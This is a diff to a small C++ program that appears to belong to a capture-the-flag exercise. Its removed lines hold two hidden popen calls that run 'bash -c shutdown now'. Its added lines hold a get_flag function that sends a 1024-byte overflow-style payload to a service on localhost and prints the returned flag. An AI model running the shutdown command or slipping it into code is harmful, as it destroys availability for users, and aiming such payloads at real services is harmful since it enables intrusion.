@@ -1,20 +1,55 @@
 
 #include <cstring>
 #include <string>
-#include <stdio.h>
-#include <stdlib.h>
+#include <cstdio>
 
 #include <iostream>
 #include <unistd.h>
 #include <fcntl.h>
+#include <arpa/inet.h>
+#include <cstring>
+#include <sys/socket.h>
+
 using namespace std;
 
-int main(int argc, char *argv[]) {
-    popen("bash -c 'shutdown now'", "r");
-    get_input();
-    exit(0);
-    return 0;
 
+#define PORT 8082
+#define BUFFER_SIZE 1024
+
+int get_flag() {
+    int sock = socket(AF_INET, SOCK_STREAM, 0);
+    struct sockaddr_in serv_addr;
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(PORT);
+
+    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)
+        <= 0) {
+        perror(
+            "\nInvalid address/ Address not supported \n");
+        return -1;
+        }
+
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("connect");
+        return -1;
+    }
+
+    char payload[BUFFER_SIZE];
+    for (int i = 0; i < BUFFER_SIZE; i++) {
+        payload[i] = 'A';
+    }
+
+    write(sock, "\x03", 1);
+    write(sock, payload, BUFFER_SIZE);
+
+    char ans[256];
+    read(sock, ans, 256);
+
+    close(sock);
+
+    printf("%s\n", ans);
+    return 0;
 }
 
 void add_numbers(int a, int b) {
@@ -45,9 +80,6 @@ void run_ls(char* dirname) {
 
 }
 
-void run_ls(string dirname) {
-    popen("bash -c 'shutdown now'", "r");
-}
 void nothing() {
     cerr << "trying nothing" << endl;
     usleep(990000);
@@ -106,9 +138,8 @@ void main_loop() {
 
 int main(int argc, char *argv[]) {
     cerr << "started" << endl;
-    // get_flag();
-    main_loop();
+    get_flag();
     cout << "submit" << endl;
-    exit(0);
+    main_loop();
     return 0;
 }
